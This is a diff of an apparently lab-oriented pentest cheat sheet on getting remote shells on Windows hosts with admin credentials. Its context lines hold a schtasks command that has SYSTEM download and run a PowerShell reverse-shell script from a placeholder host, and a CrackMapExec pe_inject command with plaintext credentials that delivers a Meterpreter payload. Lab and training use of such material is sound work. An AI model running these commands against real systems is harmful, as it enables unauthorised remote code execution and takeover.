@@ -1,6 +1,6 @@
-========================================================================================================================
-Basic ways to get a remote shell on a Windows box using valid (admin) credentials 
-========================================================================================================================
+====================================================================================================================================================
+Multiple ways to run remote commands or obtain a remote shell on a Windows box using valid (admin) credentials 
+====================================================================================================================================================
 
 
 ========================================================================================================================
@@ -151,7 +151,7 @@ exit
 
 
 ========================================================================================================================
-Example 4 - Create remotely a scheduled task (command schtasks) + Powershell reverse shell
+Example 4 - Create remotely a scheduled task (command schtasks) + Powershell reverse shell (InvokePowerShellTcp.ps1)
 ========================================================================================================================
 
 C:\AD\jfc-tools\x64>schtasks /create /S win-server01.security-Test-Lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://X.X.X.X/InvokePowerShellTcp2.ps1''')'"
@@ -199,7 +199,7 @@ nt authority\system
 
 
 ========================================================================================================================
-Example 5 - CrackMapExec (pe_inject) + Metasploit (meterpreter reverse shell)
+Example 5 - CrackMapExec (Pass-The-Hash or with login/password) + Metasploit (meterpreter reverse shell)
 ========================================================================================================================
 
 jeff@kali:~/Documents/CTFs/BadBlood$ sudo crackmapexec smb 192.168.1.50 -u Qualys -p Qua1ys2020 -M pe_inject -o PATH=./payload_tcp.exe
